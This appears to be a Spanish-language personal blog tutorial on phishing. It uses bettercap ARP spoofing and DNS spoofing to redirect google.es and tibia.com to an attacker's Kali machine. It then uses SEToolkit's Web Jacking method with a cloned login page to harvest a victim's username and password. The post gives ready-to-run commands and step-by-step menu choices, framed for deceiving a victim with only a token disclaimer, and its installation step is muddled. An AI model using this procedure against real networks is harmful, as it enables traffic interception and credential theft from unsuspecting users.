---
title: Como hacer un ataque phishing con bettercap y SEToolkit
published: true
---

Estos días no he estado escribiendo en mi blog, por dos unicas y verdaderas razones, la primera es que me compre tres cursillos de udemy sobre pentesting y mis instintos de informático se satisfacian con ello, y la segunda es que me daba un palo horrible, pero este es mi blog y le hago bullying cuando quiero.


![](/assets/phishing/smuggy.jpg)

Hoy quiero enseñar algo simple, como hacer un ataque phishing mediante ARP Spoofing y DNS Spoofing

Por cierto NO ME HAGO RESPONSABLE SI HACEIS ALGO ILEGAL CON ESTO, los black hats a la carcel por pillaos

# 1. Teoria

Creo que aqui ya todos sabemos que es una IP, asi que no lo explicaré, pero lo que hay que saber es que cada ordenador tiene otro tipo de dirección llamado MAC.

Cada vez que apuntamos a una nueva IP, nuestro ordenador preguntará por la MAC no solo de la IP final sino de cada dispositivo en el que pasemos por cada salto de red. Así que realmente cada conexión no es mediante la IP es mediante la MAC.

Dicho esto si envenenamos la red con peticiones MAC podemos corromper la conexión entre el router y cualquier maquina haciendo que tenga que pasar por nuestro ordenador, filtrando y modificando a tiempo real todas los paquetes de red, es decir un ataque Man in the middle.

-Para esta conexión usaremos una maquina virtual kali linux, y mi maquina física linux mint

 * kali -> 192.168.1.158
 * mint -> 192.168.1.91
 * gateway -> 192.168.1.1

# 2. Instalación

Nmap es una herramienta para escanear puertos muy util y con muchas funciones

En esta instalación usaremos Linux Mint aunque cualquier distribución basada en debian que use apt-get como instalador de paquetes deberia serviros

![](/assets/phishing/install-bettercap.jpg)

```bash
sudo apt update
bettercap
```

SEToolkit viene ya instalado


# 3. ARP Spoofing

Lo primero, abrir bettercap

```bash
sudo bettercap
```
![](/assets/phishing/sudo-bettercap.jpg)


Entonces pondremos estos comandos para habilitar el arp spoofing y hacer el ataque MITM


![](/assets/phishing/arp-spoof.jpg)

```bash
set arp.spoof.targets 192.168.1.91
arp.spoof on
```

Recordemos que poner la ip de la victima que queremos interceptar

Ahora, si vamos a la maquina cliente y hacemos arp -n veremos que tanto el gateway como la maquina kali tienen la misma MAC

![](/assets/phishing/muestra-arp.jpg)


De hecho si abrieramos wireshark podriamos interceptar todo el trafico de red entre la maquina mint y el router

# 4. DNS Spoofing

Vale ahora pasaremos a hacer un DNS Spoofing

![](/assets/phishing/dns-spoof.jpg)

sin sacar bettercap ni anular el arp spoofing pondremos estos comandos

```bash
set dns.spoof.address 192.168.1.158
set dns.spoof.domains google.es
dns.spoof on
```

haciendo asi que cada vez que quiera ir a google.es ira a nuestra ip kali, la cual tiene un servidor apache2 por defecto como en cualquier maquina debian

iniciaremos ese servidor apache2

![](/assets/phishing/iniciar-server.jpg)

```bash
sudo systemctl start apache2
```

![](/assets/phishing/prueba-dns-spoofing.jpg)

Como vemos funciona, aunque no todos los dominios funcionan, se que google.es sí, contra mas conocido sea mas dificil será.

Tenemos que tener en cuenta que a veces bettercap no funciona bien, si no os sale a la primera cancelais y volveis a hacerlo

# 5. Ataque phishing con Social Engineering Toolkit

Social Engineering Toolkit es una poderosisima navaja suiza con un mondongo de cacharros para hacer ataques de ingenieria social

![](/assets/phishing/cacharro.jpeg)

con bettercap haremos spoofing de tibia.com que es un mmorpg

![](/assets/phishing/cosauwu.jpg)

```bash
set arp.spoof.targets 192.168.1.91
set dns.spoof.address 192.168.1.158
set dns.spoof.domains tibia.com
arp.spoof on
dns.spoof on
```

![](/assets/phishing/parar-apache2.jpg)

detendremos apache2

y abriremos setoolkit

![](/assets/phishing/sudo-setoolkit.jpg)

aceptaremos los terminos de servicio e iremos a social-engineering attacks

![](/assets/phishing/set1.jpg)

Website attack vectors

![](/assets/phishing/set2.jpg)

Web Jacking Attack Method


![](/assets/phishing/set3.jpg)


Custom Import

![](/assets/phishing/set4.jpg)

Iremos al navegador y guardaremos la pagina web

![](/assets/phishing/guardar-web.jpg)

Solo guardaremos el html y lo guardaremos como index.html

![](/assets/phishing/unarchivo.jpg)

Pondremos la ip de nuesta maquina kali, nuestro archivo guardado index.html y la url de tibia

![](/assets/phishing/set5.jpg)

Ahora iremos a la url desde la victima y pincharemos el link.

Alerta: Es posible que le cueste detectar la conexion entre el dominio y la ip atacante, si eso sucede busca antes la web por la ip del atacante y las siguientes veces deberia funcionar. (eso ocurre en firefox, he probado en chromium, y ahí ningun problema)

![](/assets/phishing/tibia-movido.jpg)

Si usais GNU/linux como maquina victima es posible que no cargue el css, pero igualmente la victima solo pensara que simplemente no carga y que la web es legitima, además la mayoria de gente usa windows

![](/assets/phishing/cosa_tibia_update.jpg)

Si ponemos un usuario y contraseña, nos apareceran en setoolkit

![](/assets/phishing/login2.jpg)


# 6. Despedida

![](/assets/phishing/sonico-bonico.jpeg)

Bueno, por ahora ya he terminado el tutorial, asi que chao